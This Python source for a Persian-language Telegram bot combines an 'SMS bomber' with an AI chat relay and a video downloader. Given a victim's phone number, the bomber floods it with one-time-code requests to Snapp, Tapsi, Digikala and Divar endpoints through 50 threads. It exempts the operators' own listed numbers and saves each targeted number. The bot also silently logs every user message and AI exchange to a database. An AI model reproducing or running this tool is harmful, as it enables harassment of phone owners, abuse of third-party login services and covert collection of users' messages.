import os
import telebot
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from flask import Flask
from telebot import types
import random
import re
import yt_dlp
import uuid
import psycopg2
from datetime import datetime, timedelta
from datetime import timezone

# ================== DATABASE ==================
def get_db_connection():
    return psycopg2.connect(
        host=os.environ.get("DB_HOST"),
        database=os.environ.get("DB_NAME"),
        user=os.environ.get("DB_USER"),
        password=os.environ.get("DB_PASS"),
        port=os.environ.get("DB_PORT", 5432)
    )

def save_user(message):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        INSERT INTO users (user_id, username, first_name, last_name, last_seen)
        VALUES (%s, %s, %s, %s, NOW())
        ON CONFLICT (user_id)
        DO UPDATE SET
            username = EXCLUDED.username,
            first_name = EXCLUDED.first_name,
            last_name = EXCLUDED.last_name,
            last_seen = NOW()
    """, (
        message.from_user.id,
        message.from_user.username,
        message.from_user.first_name,
        message.from_user.last_name
    ))
    conn.commit()
    cur.close()
    conn.close()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ================== DATA ==================
user_sessions = {}
blocked_numbers = {
    "09224005771",
    "09182649455",
    "09059250020",
    "09180520256",
    "09189834173"
}

# ================== AI CONFIG ==================
AI_API_URL = "https://openrouter.ai/api/v1/chat/completions"
AI_API_KEY = os.environ.get("OPENROUTER_API_KEY")

# ================== ADMIN PANEL ==================
ADMINS = {6760587255}  # ← آی‌دی تلگرام خودت اینجا بذار
BOMBER_ACTIVE = True  # بمبر فعال/غیرفعال

# ================== SERVICES ==================
SERVICES = {
    'snapp': lambda num: requests.post(
        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        json={"cellphone": f"+98{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'tapsi': lambda num: requests.post(
        url="https://tap33.me/api/v2/user",
        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'digikala': lambda num: requests.post(
        url="https://api.digikala.com/v1/user/authenticate/",
        json={"username": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'divar': lambda num: requests.post(
        url="https://api.divar.ir/v5/auth/authenticate",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    # ... ادامه تمام سرویس‌هایی که در کد اصلی گذاشتی
}

# ================== DATABASE HELPERS ==================
def create_tables():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS phone_numbers (
            id SERIAL PRIMARY KEY,
            phone VARCHAR(20) UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS ai_chats (
            id SERIAL PRIMARY KEY,
            user_id BIGINT,
            message TEXT,
            response TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS all_messages (
            id SERIAL PRIMARY KEY,
            user_id BIGINT,
            message TEXT,
            chat_type VARCHAR(50),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id BIGINT PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            last_seen TIMESTAMP
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id BIGINT PRIMARY KEY
        )
    """)
    conn.commit()
    cur.close()
    conn.close()

def save_bot_message(user_id, message, chat_type="bot"):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO all_messages (user_id, message, chat_type) VALUES (%s, %s, %s)",
        (user_id, message, chat_type)
    )
    conn.commit()
    cur.close()
    conn.close()

def save_phone(phone):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO phone_numbers (phone) VALUES (%s) ON CONFLICT DO NOTHING",
        (phone,)
    )
    conn.commit()
    cur.close()
    conn.close()

def save_ai_chat(user_id, message, response):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO ai_chats (user_id, message, response) VALUES (%s, %s, %s)",
        (user_id, message, response)
    )
    conn.commit()
    cur.close()
    conn.close()

def save_all_message(user_id, message, chat_type="general"):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO all_messages (user_id, message, chat_type) VALUES (%s, %s, %s)",
        (user_id, message, chat_type)
    )
    conn.commit()
    cur.close()
    conn.close()

# ================== START / MAIN MENU ==================
@bot.message_handler(commands=['start'])
def start(message):
    save_user(message)
    bot.send_message(
        message.chat.id,
        f"درود به DrToolBox خوش آمديد\n\n"
        f"⚠️ توجه ⚠️\n\n"
        f"هرگونه استفاده از اين ربات بر عهده خود شماست.\n"
        f"توسعه‌دهنده هیچ مسئولیتی در قبال سوءاستفاده یا مشکلات قانونی ندارد.",
        reply_markup=main_menu(message.chat.id)
    )

def main_menu(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("💣بمبر💣")
    markup.row("🤖 هوش مصنوعی🤖")
    markup.row("📥 دانلودر📥")
    markup.row("☎️پشتيباني☎️")
    markup.row("بزودي")
    return markup

# ================== BOMBER ==================
@bot.message_handler(func=lambda message: message.text == "💣بمبر💣")
def bomb_button(message):
    chat_id = message.chat.id
    save_bot_message(chat_id, "بمبر")
    user_sessions[chat_id] = "waiting_phone"
    bomb(message)

@bot.message_handler(commands=['bomb'])
def bomb(message):
    user_sessions[message.chat.id] = "waiting_phone"
    bot.send_message(message.chat.id, f"به بخش اس ام اس بمبر خوش آمديد \n:"
                                      f"لطفا شماره را با 09 شروع کنيد\n"
                                      f"مثال : 09123456789\n"
                                      f"براي بازگشت به منوي اصلي : بازگشت")

# ================== DOWNLOADER ==================
@bot.message_handler(func=lambda message: message.text == "📥 دانلودر📥")
def downloader_start(message):
    user_sessions[message.chat.id] = "downloader"
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("بازگشت")
    bot.send_message(
        message.chat.id,
        "📥 *دانلودر فعال شد*\n\n"
        "🔹 لینک اینستاگرام یا یوتیوب رو بفرست\n"
        "🔹 ویدیو یا صدا برات دانلود میشه\n\n"
        "براي خروج بنويس : بازگشت",
        reply_markup=markup,
        parse_mode="Markdown"
    )
    save_bot_message(message.chat.id, "دانلودر فعال شد")

def download_media(url):
    if not os.path.exists("downloads"):
        os.makedirs("downloads")
    uid = str(uuid.uuid4())
    output = f"downloads/{uid}.%(ext)s"
    ydl_opts = {"outtmpl": output, "format": "best", "merge_output_format": "mp4", "quiet": True}
    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        info = ydl.extract_info(url, download=True)
        filename = ydl.prepare_filename(info)
    return filename

# ================== AI ==================
@bot.message_handler(func=lambda message: message.text == "🤖 هوش مصنوعی🤖")
def ai_start(message):
    chat_id = message.chat.id
    save_bot_message(chat_id, "AI")
    user_sessions[chat_id] = "ai_chat"
    bot.send_message(
        chat_id,
        "🤖 *هوش مصنوعی فعال شد*\n\n"
        "⚠توقع زيادي نداشته باش اين مدل فقط براي دسترسي راحت تر ساخته شده⚠ \n\n"
        "سوالت رو بنویس ✍️\n"
        "اين مدل از هوش مصنوعي هيچ حافظه ي مکالمه ايي ندارد , سوال خود را کامل و در يک پيغام بنويسيد\n"
        "براي خروج بنويس : بازگشت",
        parse_mode="Markdown"
    )

def ask_ai(prompt):
    headers = {
        "Authorization": f"Bearer {AI_API_KEY}",
        "Content-Type": "application/json"
    }
    system_prompt = (
        "تو يک هوش مصنوعي فارسي هستي. فقط و فقط به زبان فارسي معيار جواب بده ..."
        # متن کامل پرامپت شما اینجا
    )
    data = {
        "model": "deepseek/deepseek-r1-0528:free",
        "temperature": 0.2,
        "messages": [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": prompt}
        ]
    }
    try:
        r = requests.post(AI_API_URL, json=data, headers=headers, timeout=30)
        if r.status_code != 200:
            return f"⚠️ خطا در ارتباط با هوش مصنوععی\nStatus: {r.status_code}"
        js = r.json()
        return js["choices"][0]["message"]["content"]
    except Exception as e:
        return f"💥 خطای داخلی:\n{str(e)}"

# ================== SUPPORT ==================
@bot.message_handler(func=lambda message: message.text == "☎️پشتيباني☎️")
def support(message):
    chat_id = message.chat.id
    save_bot_message(chat_id, "پشتيباني")
    bot.send_message(
        chat_id,
        f"📞 پشتيباني ربات\n\n"
        f"براي دادن نظرات و ايده هاي خود و مشکلات خود به اين آيدي پيغام دهيد :\n"
        f"@KarenKH1\n\n"
        f"⏰ پاسخگويي در اسرع وقت"
    )

# ================== SOON ==================
@bot.message_handler(func=lambda message: message.text == "بزودي")
def soon(message):
    chat_id = message.chat.id
    save_bot_message(chat_id, "دکمه ي بزودي")
    bot.send_message(chat_id, "عامو نوشتم بزودي 😒")

# ================== ADMIN ==================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id not in ADMINS:
        return
    user_sessions[message.chat.id] = "admin_main"
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("💣 فعال/غیرفعال بمبر 💣")
    markup.row("➕ اضافه کردن ادمین", "➖ حذف ادمین")
    markup.row("📢 ارسال پیام سراسری")
    markup.row("بازگشت")
    bot.send_message(message.chat.id, "🔐 پنل ادمین", reply_markup=markup)

# ================== MESSAGE HANDLER ==================
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text.strip()
    save_user(message)
    save_all_message(chat_id, text, chat_type="user")

    # خروج از منو
    if text == "بازگشت":
        if chat_id in user_sessions:
            del user_sessions[chat_id]
        bot.send_message(chat_id, "🔙 برگشتی به منوی اصلی", reply_markup=main_menu(chat_id))
        return

    user_type = user_sessions.get(chat_id, None)

    # AI
    if user_type == "ai_chat":
        bot.send_chat_action(chat_id, "typing")
        answer = ask_ai(text)
        save_ai_chat(chat_id, text, answer)
        bot.send_message(chat_id, answer)
        save_bot_message(chat_id, answer)
        return

    # BOMBER
    if user_type == "waiting_phone":
        if not BOMBER_ACTIVE:
            bot.send_message(chat_id, "بمبر به دليل اتفاقات اخير و ضعيفي اينترنت متوقف شده است")
            del user_sessions[chat_id]
            return
        phone = text
        if not re.fullmatch(r"09\d{9}", phone):
            bot.send_message(chat_id, "❌ شماره اشتباهه\n📌 09xxxxxxxxx")
            return
        if phone in blocked_numbers:
            bot.send_message(chat_id, "به خودی نمیشه بزنی 🤨")
            save_bot_message(chat_id, "شماره بلاک شده")
            del user_sessions[chat_id]
            return
        save_phone(phone)
        user_sessions[chat_id] = "processing"
        msg = bot.send_message(chat_id, "⏳ در حال ارسال...")
        with ThreadPoolExecutor(max_workers=50) as executor:
            for f in as_completed([executor.submit(s, phone) for s in SERVICES.values()]):
                pass
        bot.edit_message_text("انجام شد ✅", chat_id, msg.message_id)
        del user_sessions[chat_id]
        return

    # DOWNLOADER
    if user_type == "downloader":
        if not ("instagram.com" in text or "youtu" in text):
            bot.send_message(chat_id, "❌ لینک معتبر نیست")
            return
        msg = bot.send_message(chat_id, "⏳ در حال دانلود...")
        try:
            file_path = download_media(text)
            with open(file_path, "rb") as f:
                bot.send_video(chat_id, f)
            os.remove(file_path)
            del user_sessions[chat_id]
        except Exception as e:
            bot.edit_message_text(f"❌ خطا\n{str(e)}", chat_id, msg.message_id)
            save_bot_message(chat_id, "خطا در دانلود")
        return

# ================== FLASK ==================
@app.route('/')
def home():
    return "Bot is running"

@app.route('/health')
def health():
    return "OK"

def run_flask():
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))

# ================== RUN ==================
if __name__ == "__main__":
    create_tables()
    import threading
    threading.Thread(target=run_flask, daemon=True).start()
    bot.infinity_polling()
